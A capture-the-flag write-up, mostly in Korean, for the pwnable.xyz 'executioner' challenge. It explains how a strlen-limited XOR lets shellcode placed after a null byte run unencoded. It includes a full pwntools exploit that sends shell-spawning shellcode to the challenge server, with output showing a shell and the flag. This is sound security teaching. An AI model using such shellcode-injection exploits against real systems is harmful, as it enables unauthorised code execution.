# [pwnable.xyz] executioner

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Let's encode this shellcode
>
> Release: [executioner.zip](https://github.com/h0meb0dy/pwnable.xyz/files/9007143/executioner.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/176348944-682c8069-b93b-4f3d-8d05-7185eeb181d1.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `solve_pow()`

```c
  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
  {
    puts("Can't open /dev/urandom");
    exit(1);
  }
  buf = 0;
  read(fd, &buf, 4uLL);
  close(fd);
```

`buf`에 `/dev/urandom`으로부터 4바이트 랜덤 값을 읽어온다.

```c
  x = 0;
  y = 0;
  printf("POW: x + y == 0x%x\n", buf);
  printf("> ");
  if ( (unsigned int)_isoc99_scanf("%d %d", &x, &y) != 2 )
  {
    puts("scanf error");
    exit(1);
  }
  getchar();
  if ( y + x != buf )
  {
    puts("POW failed");
    exit(1);
  }
  puts("Loading challenge... ");
  sleep(x * y);
  return __readfsqword(0x28u) ^ v5;
```

`buf`의 값을 알려주고 두 개의 수를 입력받아서, 두 수를 더한 결과가 `buf`의 값과 다르면 `exit()`으로 프로그램을 종료하고, 같으면 `x * y`초만큼 기다렸다가 함수를 종료한다.

### `main()`

```c
  solve_pow();
  puts("Shellcode executioner");
  fd = open("/dev/urandom", 0);
  if ( fd != -1 )
  {
    read(fd, key, 0x7FuLL);
    close(fd);
```

`key`에 `/dev/urandom`으로부터 `0x7f`바이트 랜덤 값을 읽어온다.

```c
    printf("Input: ");
    read(0, inpt, 0x7FuLL);
    for ( i = 0; i < strlen(inpt); ++i )
      inpt[i] ^= key[i];
    v6 = mmap(0LL, 0x1000uLL, 7, 34, 0, 0LL);
    *v6 = *(_QWORD *)inpt;
    v6[1] = qword_202288;
    v6[2] = qword_202290;
    v6[3] = qword_202298;
    v6[4] = qword_2022A0;
    v6[5] = qword_2022A8;
    v6[6] = qword_2022B0;
    v6[7] = qword_2022B8;
    v6[8] = qword_2022C0;
    v6[9] = qword_2022C8;
    v6[10] = qword_2022D0;
    v6[11] = qword_2022D8;
    v6[12] = qword_2022E0;
    v6[13] = qword_2022E8;
    v6[14] = qword_2022F0;
    v6[15] = qword_2022F8;
    __asm { jmp     rax }
```

`inpt`에 최대 `0x7f`바이트만큼 셸코드를 입력받고, `strlen(inpt)`만큼 `key`와 xor하고 셸코드로 점프한다.

## Exploit

`inpt`에 입력한 셸코드 전체가 아니라 `strlen(inpt)`만큼만 `key`와 xor되기 때문에, 중간에 `\x00`이 있으면 그 뒤부터는 입력한 셸코드 그대로 실행된다. 

```python
    sc = b'\x01\x00'
    sc += asm(shellcraft.sh())
```

이런 식으로 입력하면 랜덤한 2바이트 코드가 실행된 후에 셸코드가 실행되는데,

![image](https://user-images.githubusercontent.com/104156058/176362144-2b42f31f-ecfb-4683-abd7-38c768f3d113.png)

운이 좋으면 위와 같이 에러가 나지 않는 2바이트 코드가 만들어져서, 이런 경우에 셸을 획득할 수 있다.

### Full exploit

```python
from pwn import *
context(arch='amd64')

LOCAL = False

while 1:
    if LOCAL:
        r = process('./release/challenge')
    else:
        try:
            r = remote('svc.pwnable.xyz', 30025)
        except:
            continue

    sla = r.sendlineafter
    sa = r.sendafter


    # solve_pow

    r.recvuntil('POW: x + y == 0x')
    answer = int(r.recvline()[:-1], 16)
    sla('> ', str(0) + ' ' + str(answer))


    # execute shellcode

    sc = b'\x01\x00'
    sc += asm(shellcraft.sh())
    
    sa('Input: ', sc)

    try:
        r.sendline('ls')
        print(r.recvline())
        break
    except:
        r.close()


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30025: Done
[*] Closed connection to svc.pwnable.xyz port 30025
...
[+] Opening connection to svc.pwnable.xyz on port 30025: Done
b'bin\n'
[*] Switching to interactive mode
dev
etc
flag
home
lib
lib64
media
mnt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag
FLAG{strlen__x00__returns_0}
```